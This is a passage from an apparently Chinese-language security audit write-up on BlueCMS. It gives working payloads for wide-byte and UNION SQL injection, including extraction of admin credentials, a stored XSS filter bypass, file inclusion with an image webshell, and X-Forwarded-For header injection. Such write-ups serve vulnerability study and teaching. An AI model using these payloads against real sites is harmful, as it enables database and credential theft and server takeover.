src="https://bucket-img-0.oss-cn-shanghai.aliyuncs.com/img/1n8a9h9sd/202307251717430.png" alt="image-20230725171709394"></p><p>构造payload需要单引号闭合，但是单引号会触发<code>deep_addslashes()</code>函数添加一个反斜杠，这时候由于数据库编码使用的是gb2312，可以构造 <code>%df</code> 进行宽字节注入，我们这里的宽字节注入是利用的MySQL的一个特性，MySQL的在使用GBK编码的时候，会认为两个字符是一个汉字（前一个ASCII码要大于128，才到汉字的范围）。这就是MySQL的的特性，因为GBK是多字节编码，他认为两个字节代表一个汉字，所以<code>%df</code>和后面的<code>\</code>变成了一个汉字“运”，而 <code>&#39;</code> 逃逸了出来。</p><h5 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin %df&#x27; or 1=1 #</span><br></pre></td></tr></table></figure><p><img src="https://bucket-img-0.oss-cn-shanghai.aliyuncs.com/img/1n8a9h9sd/202307251724082.png" alt="image-20230725172402005"></p><p><img src="https://bucket-img-0.oss-cn-shanghai.aliyuncs.com/img/1n8a9h9sd/202307251724998.png" alt="image-20230725172442921"></p><h4 id="3、SQL注入：后台Union注入"><a href="#3、SQL注入：后台Union注入" class="headerlink" title="3、SQL注入：后台Union注入"></a>3、SQL注入：后台Union注入</h4><p>漏洞点： <code>/admin/nav.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">elseif</span>(<span class="variable">$act</span>==<span class="string">&#x27;edit&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select * from &quot;</span>.<span class="title function_ invoke__">table</span>(<span class="string">&#x27;navigate&#x27;</span>).<span class="string">&quot; where navid = &quot;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;navid&#x27;</span>];</span><br><span class="line"><span class="variable">$nav</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">getone</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$smarty</span>-&gt;<span class="title function_ invoke__">assign</span>(<span class="string">&#x27;nav&#x27;</span>,<span class="variable">$nav</span>);</span><br><span class="line"><span class="variable">$smarty</span>-&gt;<span class="title function_ invoke__">assign</span>(<span class="string">&#x27;act&#x27;</span>, <span class="variable">$act</span>);</span><br><span class="line"><span class="variable">$smarty</span>-&gt;<span class="title function_ invoke__">display</span>(<span class="string">&#x27;nav_info.htm&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>$_GER[&#39;navid&#39;]</code>没有过滤直接带入数据库执行，所以存在sql注入</p><h5 id="利用-2"><a href="#利用-2" class="headerlink" title="利用"></a>利用</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#判断字段长度</span><br><span class="line">nav.php?act=edit&amp;navid=1 order by 6#正常</span><br><span class="line">nav.php?act=edit&amp;navid=1 order by 7#报错</span><br></pre></td></tr></table></figure><p>判断回显位置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nav.php?act=edit&amp;navid=-1 union select 1,2,3,4,5,6</span><br></pre></td></tr></table></figure><p><img src="https://bucket-img-0.oss-cn-shanghai.aliyuncs.com/img/1n8a9h9sd/202307251740673.png" alt="image-20230725174040632"></p><p>获取用户名、库名、版本信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nav.php?act=edit&amp;navid=-1 union select 1,user(),database(),4,version(),6</span><br></pre></td></tr></table></figure><p><img src="https://bucket-img-0.oss-cn-shanghai.aliyuncs.com/img/1n8a9h9sd/202307251743117.png" alt="image-20230725174339069"></p><p>获取表名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nav.php?act=edit&amp;navid=-1 union select 1,2,group_concat(table_name),4,version(),6  from information_schema.tables where table_schema=database()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://bucket-img-0.oss-cn-shanghai.aliyuncs.com/img/1n8a9h9sd/202307251749783.png" alt="image-20230725174933732"></p><p>获取字段名称</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nav.php?act=edit&amp;navid=-1 union select 1,2,group_concat(column_name),4,version(),6  from information_schema.columns where table_name=0x626c75655f61646d696e</span><br></pre></td></tr></table></figure><p><img src="https://bucket-img-0.oss-cn-shanghai.aliyuncs.com/img/1n8a9h9sd/202307251750023.png" alt="image-20230725175045971"></p><p>获取admin_name和pwd字段信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nav.php?act=edit&amp;navid=-1 union select 1,admin_name,pwd,4,version(),6  from blue_admin</span><br></pre></td></tr></table></figure><p><img src="https://bucket-img-0.oss-cn-shanghai.aliyuncs.com/img/1n8a9h9sd/202307251753155.png" alt="image-20230725175322107"></p><h4 id="4、XSS：后台新闻发布处存储型"><a href="#4、XSS：后台新闻发布处存储型" class="headerlink" title="4、XSS：后台新闻发布处存储型"></a>4、XSS：后台新闻发布处存储型</h4><p>漏洞点：<code>/user.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">elseif</span> (<span class="variable">$act</span> == <span class="string">&#x27;do_add_news&#x27;</span>) &#123;</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&#x27;include/upload.class.php&#x27;</span>;</span><br><span class="line"><span class="variable">$image</span> = <span class="keyword">new</span> <span class="title function_ invoke__">upload</span>();</span><br><span class="line"><span class="variable">$title</span> = !<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;title&#x27;</span>]) ? <span class="title function_ invoke__">htmlspecialchars</span>(<span class="title function_ invoke__">trim</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;title&#x27;</span>])) : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$color</span> = !<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;color&#x27;</span>]) ? <span class="title function_ invoke__">htmlspecialchars</span>(<span class="title function_ invoke__">trim</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;color&#x27;</span>])) : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$cid</span> = !<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cid&#x27;</span>]) ? <span class="title function_ invoke__">intval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cid&#x27;</span>]) : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$cid</span>))&#123;</span><br><span class="line"><span class="title function_ invoke__">showmsg</span>(<span class="string">&#x27;新闻分类不能为空&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$author</span> = !<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;author&#x27;</span>]) ? <span class="title function_ invoke__">htmlspecialchars</span>(<span class="title function_ invoke__">trim</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;author&#x27;</span>])) : <span class="variable">$_SESSION</span>[<span class="string">&#x27;admin_name&#x27;</span>];</span><br><span class="line"><span class="variable">$source</span> = !<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;source&#x27;</span>]) ? <span class="title function_ invoke__">htmlspecialchars</span>(<span class="title function_ invoke__">trim</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;source&#x27;</span>])) : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$content</span> = !<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>]) ? <span class="title function_ invoke__">filter_data</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>]) : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$descript</span> = !<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;descript&#x27;</span>]) ? <span class="title function_ invoke__">mb_substr</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;descript&#x27;</span>], <span class="number">0</span>, <span class="number">90</span>) : <span class="title function_ invoke__">mb_substr</span>(<span class="title function_ invoke__">html2text</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>]),<span class="number">0</span>, <span class="number">90</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;lit_pic&#x27;</span>][<span class="string">&#x27;error&#x27;</span>]) &amp;&amp; <span class="variable">$_FILES</span>[<span class="string">&#x27;lit_pic&#x27;</span>][<span class="string">&#x27;error&#x27;</span>] == <span class="number">0</span>)&#123;</span><br><span class="line"><span class="variable">$lit_pic</span> = <span class="variable">$image</span>-&gt;<span class="title function_ invoke__">img_upload</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;lit_pic&#x27;</span>],<span class="string">&#x27;lit_pic&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">   <span class="variable">$lit_pic</span> = <span class="keyword">empty</span>(<span class="variable">$lit_pic</span>) ? <span class="string">&#x27;&#x27;</span> : <span class="variable">$lit_pic</span>;</span><br></pre></td></tr></table></figure><p>在新闻发布处，<code>content</code> 字段未使用 <code>htmlspecialchars</code> 而是使用 <code>filter_data</code> 进行处理，我们跟踪 <code>filter_data</code> 函数分析</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//在 &quot;/include/common.fun.php&quot; 找到函数定义代码</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter_data</span>(<span class="params"><span class="variable">$str</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/&lt;(\/?)(script|i?frame|meta|link)(\s*)[^&lt;]*&gt;/&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$str</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数只过滤了script，iframe，frame，meta，link 等，这里可以使用img标签绕过</p><h5 id="利用-3"><a href="#利用-3" class="headerlink" title="利用"></a>利用</h5><p><img src="https://bucket-img-0.oss-cn-shanghai.aliyuncs.com/img/1n8a9h9sd/202307261022856.png" alt="image-20230726102208775"></p><p><img src="https://bucket-img-0.oss-cn-shanghai.aliyuncs.com/img/1n8a9h9sd/202307261022926.png" alt="image-20230726102232882"></p><h4 id="5、文件包含"><a href="#5、文件包含" class="headerlink" title="5、文件包含"></a>5、文件包含</h4><p>漏洞点：<code>user.php</code></p><p>user.php 的支付功能，可以通过 $_POST[‘pay’] 控制文件包含的路径，但是后面拼接了 &#x2F;index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">elseif</span> (<span class="variable">$act</span> == <span class="string">&#x27;pay&#x27;</span>)&#123;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;data/pay.cache.php&#x27;</span>;</span><br><span class="line"><span class="variable">$price</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;price&#x27;</span>];</span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$name</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pay&#x27;</span>])) &#123;</span><br><span class="line"><span class="title function_ invoke__">showmsg</span>(<span class="string">&#x27;对不起，您没有选择支付方式&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;include/payment/&#x27;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;pay&#x27;</span>].<span class="string">&quot;/index.php&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>有两种方式可以截断</p><p>绕过方法1：%00 截断</p><p>条件：magic_quotes_gpc &#x3D; Off，PHP版本&lt;5.3.4</p><p>绕过方法2：路径长度截断</p><p>条件：windows 下目录路径最大长度为256字节，超出部分将丢弃；linux 下目录最大长度为4096字节，超出长度将丢弃；PHP版本&lt;5.2.8</p></blockquote><h5 id="利用-4"><a href="#利用-4" class="headerlink" title="利用"></a>利用</h5><p>由于我php版本为5.6.27，这里降级到5.2.17做测试，测试中%00截断不知道为什么无法利用(满足使用条件)，使用路径长度截断</p><p>构造payload进行包含</p><p><img src="https://bucket-img-0.oss-cn-shanghai.aliyuncs.com/img/1n8a9h9sd/202307261104645.png" alt="image-20230726110416576"></p><p>在个人头像处构造图片马上传</p><p><img src="https://bucket-img-0.oss-cn-shanghai.aliyuncs.com/img/1n8a9h9sd/202307261109458.png" alt="image-20230726110914400"></p><p><img src="https://bucket-img-0.oss-cn-shanghai.aliyuncs.com/img/1n8a9h9sd/202307261109420.png" alt="image-20230726110935351"></p><p>包含图片马</p><p><img src="https://bucket-img-0.oss-cn-shanghai.aliyuncs.com/img/1n8a9h9sd/202307261110292.png" alt="image-20230726111001230"></p><p>这里可以使用fput写一个马进去，文件包含后生成新马用webshell工具管理更方便</p><h4 id="6、SQL注入：XFF头注入"><a href="#6、SQL注入：XFF头注入" class="headerlink" title="6、SQL注入：XFF头注入"></a>6、SQL注入：XFF头注入</h4><p>漏洞点：<code>/include/common.fun.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getip</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">getenv</span>(<span class="string">&#x27;HTTP_CLIENT_IP&#x27;</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$ip</span> = <span class="title function_ invoke__">getenv</span>(<span class="string">&#x27;HTTP_CLIENT_IP&#x27;</span>); </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span> (<span class="title function_ invoke__">getenv</span>(<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>)) </span><br><span class="line">&#123; <span class="comment">//获取客户端用代理服务器访问时的真实ip 地址</span></span><br><span class="line"><span class="variable">$ip</span> = <span class="title function_ invoke__">getenv</span>(<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span> (<span class="title function_ invoke__">getenv</span>(<span class="string">&#x27;HTTP_X_FORWARDED&#x27;</span>)) </span><br><span class="line">&#123; </span><br><span class="line"><span class="variable">$ip</span> = <span class="title function_ invoke__">getenv</span>(<span class="string">&#x27;HTTP_X_FORWARDED&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span> (<span class="title function_ invoke__">getenv</span>(<span class="string">&#x27;HTTP_FORWARDED_FOR&#x27;</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$ip</span> = <span class="title function_ invoke__">getenv</span>(<span class="string">&#x27;HTTP_FORWARDED_FOR&#x27;</span>); </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span> (<span class="title function_ invoke__">getenv</span>(<span class="string">&#x27;HTTP_FORWARDED&#x27;</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$ip</span> = <span class="title function_ invoke__">getenv</span>(<span class="string">&#x27;HTTP_FORWARDED&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123; </span><br><span class="line"><span class="variable">$ip</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$ip</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>getip()</code> 获取的XFF头中的IP直接返回 <code>$ip</code>  这里跟踪下看看那个地方调用了 <code>getip()</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">elseif</span>(<span class="variable">$act</span> == <span class="string">&#x27;send&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$id</span>))</span><br><span class="line">&#123;</span><br><span class="line"> <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="variable">$user_id</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;user_id&#x27;</span>] ? <span class="variable">$_SESSION</span>[<span class="string">&#x27;user_id&#x27;</span>] : <span class="number">0</span>;</span><br><span class="line"> <span class="variable">$mood</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;mood&#x27;</span>]);</span><br><span class="line"> <span class="variable">$content</span> = !<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;comment&#x27;</span>]) ? <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;comment&#x27;</span>]) : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"> <span class="variable">$content</span> = <span class="title function_ invoke__">nl2br</span>(<span class="variable">$content</span>);</span><br><span class="line"> <span class="variable">$type</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;type&#x27;</span>]);</span><br><span class="line"> <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$content</span>))</span><br><span class="line"> &#123;</span><br><span class="line"> <span class="title function_ invoke__">showmsg</span>(<span class="string">&#x27;评论内容不能为空&#x27;</span>);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">if</span>(<span class="variable">$_CFG</span>[<span class="string">&#x27;comment_is_check&#x27;</span>] == <span class="number">0</span>)</span><br><span class="line"> &#123;</span><br><span class="line"> <span class="variable">$is_check</span> = <span class="number">1</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">else</span></span><br><span class="line"> &#123;</span><br><span class="line"> <span class="variable">$is_check</span> = <span class="number">0</span>;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="variable">$sql</span> = <span class="string">&quot;INSERT INTO &quot;</span>.<span class="title function_ invoke__">table</span>(<span class="string">&#x27;comment&#x27;</span>).<span class="string">&quot; (com_id, post_id, user_id, type, mood, content, pub_date, ip, is_check) </span></span><br><span class="line"><span class="string"> VALUES (&#x27;&#x27;, &#x27;<span class="subst">$id</span>&#x27;, &#x27;<span class="subst">$user_id</span>&#x27;, &#x27;<span class="subst">$type</span>&#x27;, &#x27;<span class="subst">$mood</span>&#x27;, &#x27;<span class="subst">$content</span>&#x27;, &#x27;<span class="subst">$timestamp</span>&#x27;, &#x27;&quot;</span>.<span class="title function_ invoke__">getip</span>().<span class="string">&quot;&#x27;, &#x27;<span class="subst">$is_check</span>&#x27;)&quot;</span>;</span><br><span class="line"> <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line"> <span class="keyword">if</span>(<span class="variable">$type</span> == <span class="number">1</span>)</span><br><span class="line"> &#123;</span><br><span class="line"> <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;UPDATE &quot;</span>.<span class="title function_ invoke__">table</span>(<span class="string">&#x27;article&#x27;</span>).<span class="string">&quot; SET comment = comment+1 WHERE id = &quot;</span>.<span class="variable">$id</span>);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">elseif</span>(<span class="variable">$type</span> == <span class="number">0</span>)</span><br><span class="line"> &#123;</span><br><span class="line"> <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;UPDATE &quot;</span>.<span class="title function_ invoke__">table</span>(<span class="string">&#x27;post&#x27;</span>).<span class="string">&quot; SET comment = comment+1 WHERE post_id = &quot;</span>.<span class="variable">$id</span>);</span><br><span class="line"> &#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_CFG</span>[<span class="string">&#x27;comment_is_check&#x27;</span>] == <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="title function_ invoke__">showmsg</span>(<span class="string">&#x27;请稍候，您的评论正在审核当中...&#x27;</span>,<span class="string">&#x27;comment.php?id=&#x27;</span>.<span class="variable">$id</span>.<span class="string">&#x27;&amp;type=&#x27;</span>.<span class="variable">$type</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="title function_ invoke__">showmsg</span>(<span class="string">&#x27;发布评论成功&#x27;</span>,<span class="string">&#x27;comment.php?id=&#x27;</span>.<span class="variable">$id</span>.<span class="string">&#x27;&amp;type=&#x27;</span>.<span class="variable">$type</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>comment.php</code> 中直接将 <code>getip()</code> 插入数据库语句中，没有过滤就执行了，这里存在sql注入</p><blockquote><p>首先需要构造闭合将第一次插入的IP和is_check补全，然后构造二次插入，要闭合原本语句的单引号</p></blockquote><h5 id="利用-5"><a href="#利用-5" class="headerlink" title="利用"></a>利用</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//payload</span></span><br><span class="line"><span class="comment">//原始语句</span></span><br><span class="line">INSERT INTO <span class="title function_ invoke__">blue_comment</span> (com_id, post_id, user_id, type, mood, content, pub_date, ip, is_check) <span class="title function_ invoke__">VALUES</span> (<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;qwe&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//构造的payload最终在数据中的效果</span></span><br><span class="line">INSERT INTO <span class="title function_ invoke__">blue_comment</span> (com_id, post_id, user_id, type, mood, content, pub_date, ip, is_check) <span class="title function_ invoke__">VALUES</span> (<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;asd&#x27;</span>,<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;6&#x27;</span>,<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;6&#x27;</span>,(<span class="title function_ invoke__">database</span>()),<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="string">&#x27;1&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="number">127.0</span>.<span class="number">0.1</span><span class="string">&#x27;,&#x27;</span><span class="number">1</span><span class="string">&#x27;),(&#x27;</span><span class="string">&#x27;, &#x27;</span><span class="number">6</span><span class="string">&#x27;,&#x27;</span><span class="number">0</span><span class="string">&#x27;,&#x27;</span><span class="number">1</span><span class="string">&#x27;,&#x27;</span><span class="number">6</span><span class="string">&#x27;,(database()),&#x27;</span><span class="number">127.0</span>.<span class="number">0.1</span><span class="string">&#x27;,&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure><p>burp抓包修改</p><p><img src="https://bucket-img-0.oss-cn-shanghai.aliyuncs.com/img/1n8a9h9sd/202307261536159.png" alt="image-20230726153635061"></p><p><img src="https://bucket-img-0.oss-cn-shanghai.aliyuncs.com/img/1n8a9h9sd/202307261537891.png" alt="image-20230726153741832"></p><p><img src="https://bucket-img-0.oss-cn-shanghai.aliyuncs.com/img/1n8a9h9sd/202307261538760.png" alt="image-20230726153812695"></p><p>可以看到 <code>content</code> 为回显位，构造payload即可</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取库名为bluecms</span></span><br><span class="line"><span class="number">127.0</span>.<span class="number">0.1</span><span class="string">&#x27;,&#x27;</span><span class="number">1</span><span class="string">&#x27;),(&#x27;</span><span class="string">&#x27;, &#x27;</span><span class="number">6</span><span class="string">&#x27;,&#x27;</span><span class="number">0</span><span class="string">&#x27;,&#x27;</span><span class="number">1</span><span class="string">&#x27;,&#x27;</span><span class="number">6</span><span class="string">&#x27;,(database()),&#x27;</span><span class="number">127.0</span>.<span class="number">0.1</span><span class="string">&#x27;,&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure><p><img src="https://bucket-img-0.oss-cn-shanghai.aliyuncs.com/img/1n8a9h9sd/202307261540597.png" alt="image-20230726154042529"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取表名</span></span><br><span class="line"><span class="number">127.0</span>.<span class="number">0.1</span><span class="string">&#x27;,&#x27;</span><span class="number">1</span><span class="string">&#x27;),(&#x27;</span><span class="string">&#x27;, &#x27;</span><span class="number">6</span><span class="string">&#x27;,&#x27;</span><span class="number">0</span><span class="string">&#x27;,&#x27;</span><span class="number">1</span><span class="string">&#x27;,&#x27;</span><span class="number">6</span><span class="string">&#x27;,(select group_concat(table_name) from information_schema.tables where table_schema=database()),&#x27;</span><span class="number">127.0</span>.<span class="number">0.1</span><span class="string">&#x27;,&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure><p><img src="https://bucket-img-0.oss-cn-shanghai.aliyuncs.com/img/1n8a9h9sd/202307261544095.png" alt="image-20230726154405023"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取字段名</span></span><br><span class="line"><span class="number">127.0</span>.<span class="number">0.1</span><span class="string">&#x27;,&#x27;</span><span class="number">1</span><span class="string">&#x27;),(&#x27;</span><span class="string">&#x27;, &#x27;</span><span class="number">6</span><span class="string">&#x27;,&#x27;</span><span class="number">0</span><span class="string">&#x27;,&#x27;</span><span class="number">1</span><span 